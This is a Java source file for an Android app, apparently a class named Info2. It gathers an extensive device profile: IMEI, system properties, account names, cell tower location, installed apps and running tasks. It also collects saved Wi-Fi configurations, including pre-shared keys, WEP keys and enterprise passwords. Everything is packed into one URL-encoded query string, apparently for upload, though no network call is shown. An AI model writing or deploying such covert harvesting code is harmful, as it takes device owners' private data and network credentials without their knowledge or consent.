package com.zengming.yuntu;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.InputStreamReader;
import java.net.URLEncoder;
import java.util.Arrays;
import java.util.List;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.annotation.SuppressLint;
import android.annotation.TargetApi;
import android.app.ActivityManager;
import android.app.ActivityManager.MemoryInfo;
import android.app.ActivityManager.RecentTaskInfo;
import android.app.ActivityManager.RunningAppProcessInfo;
import android.app.ActivityManager.RunningTaskInfo;
import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.ConfigurationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.net.DhcpInfo;
import android.net.wifi.ScanResult;
import android.net.wifi.WifiConfiguration;
import android.net.wifi.WifiEnterpriseConfig;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Environment;
import android.os.StatFs;
import android.telephony.CellLocation;
import android.telephony.NeighboringCellInfo;
import android.telephony.TelephonyManager;
import android.telephony.cdma.CdmaCellLocation;
import android.telephony.gsm.GsmCellLocation;
import android.util.DisplayMetrics;

public class Info2 {
	
	@TargetApi(Build.VERSION_CODES.JELLY_BEAN_MR2)
	@SuppressWarnings("deprecation")
	private static String getdisk(String path){
		StringBuilder sb = new StringBuilder();
		sb.append(path).append("{\n");
		StatFs stat = new StatFs(path);
		sb.append("BlockSize=").append(stat.getBlockSize()).append("\n");
		sb.append("BlockCount=").append(stat.getBlockCount()).append("\n");
		sb.append("FreeBlocks=").append(stat.getFreeBlocks()).append("\n");
		sb.append("AvailableBlocks=").append(stat.getAvailableBlocks()).append("\n");
		
		if(Build.VERSION.SDK_INT >= 18){
			sb.append("BlockSizeLong=").append(stat.getBlockSizeLong()).append("\n");
			sb.append("BlockCountLong=").append(stat.getBlockCountLong()).append("\n");
			sb.append("FreeBlocksLong=").append(stat.getFreeBlocksLong()).append("\n");
			sb.append("FreeBytes=").append(stat.getFreeBytes()).append("\n");
			sb.append("AvailableBlocksLong=").append(stat.getAvailableBlocksLong()).append("\n");
			sb.append("AvailableBytes=").append(stat.getAvailableBytes()).append("\n");
			sb.append("TotalBytes=").append(stat.getTotalBytes()).append("\n");
		}else{
			sb.append("api level"+Build.VERSION.SDK_INT).append("\n");
		}
		sb.append("}").append(path).append("\n");
		
		File f = new File(path);
		if(f.canWrite()){
			String files[] = f.list();
			if(files!=null){
				sb.append(path).append(",list{\n");
				for (String s : files) {
					sb.append(s).append("\n");
				}
				sb.append("}list,").append(path).append("\n");
			}
		}
		return sb.toString();
	}
	
	private static String getDisplayMetrics(Context context){
		DisplayMetrics dm = context.getResources().getDisplayMetrics();
		return "DisplayMetrics{xdpi="+dm.xdpi
				+",ydpi="+dm.ydpi
				+",density="+dm.density
				+",densityDpi="+dm.densityDpi
				+",scaledDensity="+dm.scaledDensity
				+"}\n";
	}
	
	private static String getFile(String path){
		StringBuffer sb = new StringBuffer();
		sb.append(path).append("{\n");
		try {
			FileReader fr = new FileReader(path);
			BufferedReader br = new BufferedReader(fr);
			String line;
			while((line=br.readLine())!=null){
				sb.append(line);
				sb.append("\n");
			}
			br.close();
		} catch (Exception e) {
			e.printStackTrace();
		}
		sb.append("}").append(path).append("\n");
		return sb.toString();
	}
	private static String getProp(Context context){
		StringBuffer sb = new StringBuffer("getprop{\n");
		try {
			Process process = Runtime.getRuntime().exec("getprop");
			BufferedReader br = new BufferedReader(new InputStreamReader(process.getInputStream()));
			String line;
			while((line=br.readLine())!=null){
				sb.append(line);
				sb.append("\n");
			}
			br.close();
		} catch (Exception e) {
			e.printStackTrace();
		}
		sb.append("}getprop\n");
		return sb.toString();
	}
	
	private static String getDiskInfo(){
		String ret = "";
		try{
			File f = Environment.getExternalStorageDirectory();
			if(f.canWrite()){
				ret += getdisk(f.getAbsolutePath());
			}
			f = new File(System.getenv("EXTERNAL_STORAGE"));
			if(f.canWrite()){
				ret += "\n\n"+ getdisk(f.getAbsolutePath());
			}
			f = new File(System.getenv("SECONDARY_STORAGE"));
			if(f.canWrite()){
				ret += "\n\n"+ getdisk(f.getAbsolutePath());
			}
			ret += "\n\n"+ getdisk("/data");
		}catch(Throwable t){
			t.printStackTrace();
		}
		return ret;
	}
	
	private static String getAccounts(Context context){
		StringBuilder sb = new StringBuilder("accounts{\n");
		try{
			AccountManager accountManager = AccountManager.get(context);
			Account[] accounts = accountManager.getAccounts();
			for (Account account : accounts) {
				sb.append(account.toString()).append("\n");
			}
		}catch(Throwable t){
			t.printStackTrace();
		}
		sb.append("}accounts\n");
		return sb.toString();
	}
	@TargetApi(Build.VERSION_CODES.JELLY_BEAN_MR2)
	private static String getWIFI(Context context){
		String ret = "";
		WifiManager wm = (WifiManager) context.getSystemService(Context.WIFI_SERVICE);
		try{
			ret += "WifiInfo{"+wm.getConnectionInfo().toString()+"}\n";
		}catch(Throwable t){
			t.printStackTrace();
		}
		try{
			List<ScanResult> scanResults = wm.getScanResults();
			StringBuilder sb = new StringBuilder();
			if(scanResults != null){
				for(ScanResult sr : scanResults){
					sb.append("ScanResult{")
					.append(sr.toString())
					.append("}\n");
				}
			}
			ret += "\n\n"+sb.toString();
		}catch(Throwable t){
			t.printStackTrace();
		}
		try{
			DhcpInfo dhcpInfo = wm.getDhcpInfo();
			StringBuilder sb = new StringBuilder();
			sb.append("DhcpInfo{\n")
			.append("ipAddress=").append(dhcpInfo.ipAddress).append("\n")
		    .append("gateway=").append(dhcpInfo.gateway).append("\n")
		    .append("netmask=").append(dhcpInfo.netmask).append("\n")
		    .append("dns1=").append(dhcpInfo.dns1).append("\n")
		    .append("dns2=").append(dhcpInfo.dns2).append("\n")
		    .append("serverAddress=").append(dhcpInfo.serverAddress).append("\n")
		    .append("leaseDuration=").append(dhcpInfo.leaseDuration).append("\n")
		    .append("}\n");
			ret += "\n\n" + sb.toString();
		}catch(Throwable t){
			t.printStackTrace();
		}
	    
		try{
			StringBuilder sb = new StringBuilder();
			List<WifiConfiguration> configuredNetworks = wm.getConfiguredNetworks();
			if(configuredNetworks != null){
				for (WifiConfiguration cfg : configuredNetworks) {
					sb.append("WifiConfiguration{\n")
					.append("networkId=").append(cfg.networkId).append("\n")
					.append("status=").append(cfg.status).append("\n")
					.append("SSID=").append(cfg.SSID).append("\n")
					.append("BSSID=").append(cfg.BSSID).append("\n")
					.append("preSharedKey=").append(cfg.preSharedKey).append("\n")
					.append("wepKeys=").append(Arrays.toString(cfg.wepKeys)).append("\n")
					.append("wepTxKeyIndex=").append(cfg.wepTxKeyIndex).append("\n")
					.append("priority=").append(cfg.priority).append("\n")
					.append("hiddenSSID=").append(cfg.hiddenSSID).append("\n");
					if(Build.VERSION.SDK_INT>=18){
						try{
							WifiEnterpriseConfig ccc = cfg.enterpriseConfig;
							sb.append("getEapMethod=").append(ccc.getEapMethod()).append("\n")
							.append("getPhase2Method=").append(ccc.getPhase2Method()).append("\n")
							.append("getIdentity=").append(ccc.getIdentity()).append("\n")
							.append("getAnonymousIdentity=").append(ccc.getAnonymousIdentity()).append("\n")
							.append("getPassword=").append(ccc.getPassword()).append("\n")
							.append("getSubjectMatch=").append(ccc.getSubjectMatch()).append("\n");
						}catch(Throwable t){
							t.printStackTrace();
						}
					}
					sb.append("}\n");
				}
			}
			ret += "\n\n" + sb.toString(); 
		}catch(Throwable t){
			t.printStackTrace();
		}
		return ret;
	}
	private static String getCellLocation(Context context){
		String ret = "";
		TelephonyManager tm  = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
		try{
			CellLocation cellLocation = tm.getCellLocation();
			if(cellLocation != null){
				StringBuilder sb = new StringBuilder("CellLocation{\n");
		        switch(tm.getPhoneType()) {
			        case TelephonyManager.PHONE_TYPE_CDMA:{
			        	CdmaCellLocation loc = (CdmaCellLocation) cellLocation;
			        	sb.append("getBaseStationId=").append(loc.getBaseStationId()).append("\n")
			        	.append("getBaseStationLatitude=").append(loc.getBaseStationLatitude()).append("\n")
			        	.append("getBaseStationLongitude=").append(loc.getBaseStationLongitude()).append("\n")
			        	.append("getSystemId=").append(loc.getSystemId()).append("\n")
			        	.append("getNetworkId=").append(loc.getNetworkId()).append("\n");
			        	break;
			        }
			        case TelephonyManager.PHONE_TYPE_GSM:{
			            GsmCellLocation loc = (GsmCellLocation) cellLocation;
			            sb.append("getLac=").append(loc.getLac()).append("\n")
			            .append("getCid=").append(loc.getCid()).append("\n")
			            .append("getPsc=").append(loc.getPsc()).append("\n");
			            break;
			        }
		        }
		        sb.append("type=").append(tm.getPhoneType()).append("\n");
		        sb.append("}CellLocation\n");
				ret += sb.toString(); 
			}
		}catch (Throwable e) {
			e.printStackTrace();
		}
		
		List<NeighboringCellInfo> cellInfos = tm.getNeighboringCellInfo();
		if(cellInfos != null){
			StringBuilder sb = new StringBuilder();
			for (NeighboringCellInfo info : cellInfos) {
				sb.append("NeighboringCellInfo{\n")
				.append("getRssi=").append(info.getRssi()).append("\n")
				.append("getLac=").append(info.getLac()).append("\n")
				.append("getCid=").append(info.getCid()).append("\n")
				.append("getPsc=").append(info.getPsc()).append("\n")
				.append("getNetworkType=").append(info.getNetworkType()).append("\n")
				.append("}\n");
			}
			ret += "\n\n" + sb.toString(); 
		}
		return ret;
	}
	
	private static String urlEncode(String str){
		try {
			return URLEncoder.encode(str, "UTF-8");
		} catch (Exception e) {
		}
		return null;
	}
	
	public static String get(Context context) {
		ActivityManager am = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
		PackageManager pm = context.getPackageManager();
		TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
		
		String ret = "imei=" + tm.getDeviceId()
		 + "&DisplayMetrics=" + urlEncode(getDisplayMetrics(context))
		 + "&BuildProp=" + urlEncode(getFile("/system/build.prop"))
		 + "&cpuinfo=" + urlEncode(getFile("/proc/cpuinfo"))
		 + "&meminfo=" + urlEncode(getFile("/proc/meminfo"))
		 + "&Prop=" + urlEncode(getProp(context))
		 + "&DiskInfo=" + urlEncode(getDiskInfo())
		 + "&Accounts=" + urlEncode(getAccounts(context))
		 + "&WIFI=" + urlEncode(getWIFI(context))
		 + "&CellLocation=" + urlEncode(getCellLocation(context))
		 + "&InstalledPackages=" + urlEncode(getInstalledPackages(pm))
		 + "&InstalledApplications=" + urlEncode(getInstalledApplications(pm))
		 + "&RecentTasks=" + urlEncode(getRecentTasks(am))
		 + "&RunningTasks=" + urlEncode(getRunningTasks(am))
		 + "&MemoryInfo=" + urlEncode(getMemoryInfo(am))
		 + "&RunningApp=" + urlEncode(getRunningApp(am))
		 + "&Libs=" + urlEncode(getLibs(pm))
		 ;
		return ret;
	}

	private static String getInstalledPackages(PackageManager pm) {
		List<PackageInfo> installedPackages = pm.getInstalledPackages(0);
		StringBuilder sb = new StringBuilder();
		if(installedPackages != null){
			for (PackageInfo info : installedPackages) {
				sb.append("PackageInfo{\n")
				.append("packageName=").append(info.packageName).append("\n")
				.append("versionCode=").append(info.versionCode).append("\n")
				.append("versionName=").append(info.versionName).append("\n");
				try{
					int i = info.baseRevisionCode;
					sb.append("baseRevisionCode=").append(i).append("\n");
				}catch(Throwable t){
				}
				sb.append("sharedUserId=").append(info.sharedUserId).append("\n")
				.append("sharedUserLabel=").append(info.sharedUserLabel).append("\n")
				.append("firstInstallTime=").append(info.firstInstallTime).append("\n")
				.append("lastUpdateTime=").append(info.lastUpdateTime).append("\n")
				.append("gids=").append(Arrays.toString(info.gids)).append("\n")
				.append("}\n");
			}
		}
		return sb.toString();
	}

	@SuppressLint("NewApi")
	private static String getInstalledApplications(PackageManager pm) {
		List<ApplicationInfo> installedApplications = pm.getInstalledApplications(0);
		StringBuilder sb = new StringBuilder();
		if(installedApplications!=null){
			for (ApplicationInfo info : installedApplications) {
				sb.append("ApplicationInfo{\n")
				.append("taskAffinity=").append(info.taskAffinity).append("\n")
				.append("permission=").append(info.permission).append("\n")
				.append("processName=").append(info.processName).append("\n")
				.append("className=").append(info.className).append("\n")
				.append("descriptionRes=").append(info.descriptionRes).append("\n")
				.append("theme=").append(info.theme).append("\n")
				.append("manageSpaceActivityName=").append(info.manageSpaceActivityName).append("\n")
				.append("backupAgentName=").append(info.backupAgentName).append("\n")
				.append("flags=").append(info.flags).append("\n")
				.append("sourceDir=").append(info.sourceDir).append("\n")
				.append("publicSourceDir=").append(info.publicSourceDir).append("\n")
				.append("dataDir=").append(info.dataDir).append("\n")
				.append("nativeLibraryDir=").append(info.nativeLibraryDir).append("\n")
				.append("uid=").append(info.uid).append("\n")
				.append("targetSdkVersion=").append(info.targetSdkVersion).append("\n")
				.append("enabled=").append(info.enabled).append("\n");

				if(Build.VERSION.SDK_INT >= 14){
					sb.append("uiOptions=").append(info.uiOptions).append("\n");
				}
				if(Build.VERSION.SDK_INT >= 13){
					sb.append("requiresSmallestWidthDp=").append(info.requiresSmallestWidthDp).append("\n")
					.append("compatibleWidthLimitDp=").append(info.compatibleWidthLimitDp).append("\n")
					.append("largestWidthLimitDp=").append(info.largestWidthLimitDp).append("\n");
				}
				if(Build.VERSION.SDK_INT >= 21){
					sb.append("splitSourceDirs=").append(Arrays.toString(info.splitSourceDirs)).append("\n")
					.append("splitPublicSourceDirs=").append(Arrays.toString(info.splitPublicSourceDirs)).append("\n");
				}
				sb.append("sharedLibraryFiles=").append(Arrays.toString(info.sharedLibraryFiles)).append("\n")
				.append("}\n");
			}
		}
		return sb.toString();
	}

	@SuppressLint("NewApi")
	private static String getRecentTasks(ActivityManager am) {
		@SuppressWarnings("deprecation")
		List<RecentTaskInfo> recentTasks = am.getRecentTasks(Integer.MAX_VALUE, ActivityManager.RECENT_WITH_EXCLUDED);
		StringBuilder sb  = new StringBuilder();
		if(recentTasks != null){
			for (RecentTaskInfo info : recentTasks) {
				sb.append("RecentTaskInfo{\n")
				.append("id=").append(info.id).append("\n")
				.append("baseIntent=").append(info.baseIntent).append("\n")
				.append("origActivity=").append(info.origActivity).append("\n");
				if(Build.VERSION.SDK_INT >= 12){
					sb.append("persistentId=").append(info.persistentId).append("\n");
				}
				if(Build.VERSION.SDK_INT >= 11){
					sb.append("description=").append(info.description).append("\n");
				}
				if(Build.VERSION.SDK_INT >= 21){
					sb.append("affiliatedTaskId=").append(info.affiliatedTaskId).append("\n")
					.append("taskDescription=").append(info.taskDescription).append("\n");
				}
				sb.append("}RecentTaskInfo\n");
			}
		}
		return sb.toString();
	}

	private static String getRunningTasks(ActivityManager am) {
		//android.permission.GET_TASKS
		@SuppressWarnings("deprecation")
		List<RunningTaskInfo> runningTasks = am.getRunningTasks(Integer.MAX_VALUE);
		StringBuilder sb  = new StringBuilder();
		if(runningTasks != null){
			for (RunningTaskInfo info : runningTasks) {
				sb.append("RunningTaskInfo{\n")
				.append("id=").append(info.id).append("\n")
				.append("baseActivity=").append(info.baseActivity).append("\n")
				.append("topActivity=").append(info.topActivity).append("\n")
				.append("description=").append(info.description).append("\n")
				.append("numActivities=").append(info.numActivities).append("\n")
				.append("numRunning=").append(info.numRunning).append("\n")
				.append("}RunningTaskInfo\n");
			}
		}
		return sb.toString();
	}

	@TargetApi(Build.VERSION_CODES.JELLY_BEAN)
	private static String getMemoryInfo(ActivityManager am) {
		MemoryInfo outInfo = new MemoryInfo();
		am.getMemoryInfo(outInfo);
		String m = "MemoryInfo{availMem=" + outInfo.availMem + ",threshold=" + outInfo.threshold;
		if(Build.VERSION.SDK_INT >= 16){
			 m += ",totalMem=" + outInfo.totalMem;
		}
		m += ",lowMemory=" + outInfo.lowMemory + "}\n";
		return m;
	}

	private static String getRunningApp(ActivityManager am) {
		List<RunningAppProcessInfo> runningAppProcesses = am.getRunningAppProcesses();
		StringBuilder sb = new StringBuilder();
		if(runningAppProcesses != null){
			for (RunningAppProcessInfo info : runningAppProcesses) {
				sb.append("RunningAppProcessInfo{")
				.append("processName=").append(info.processName)
				.append(",pid=").append(info.pid)
				.append(",uid=").append(info.uid)
				.append(",pkgList=").append(Arrays.toString(info.pkgList))
				.append("}\n");
			}
		}
		return sb.toString();
	}

	private static String getLibs(PackageManager pm) {
		String[] libs = pm.getSystemSharedLibraryNames();
		StringBuilder sb = new StringBuilder();
		if(libs != null){
			sb.append("SharedLibrarys{\n");
			for (String s : libs) {
				sb.append(s).append("\n");
			}
			sb.append("}\n");
		}
		return sb.toString();
	}

}
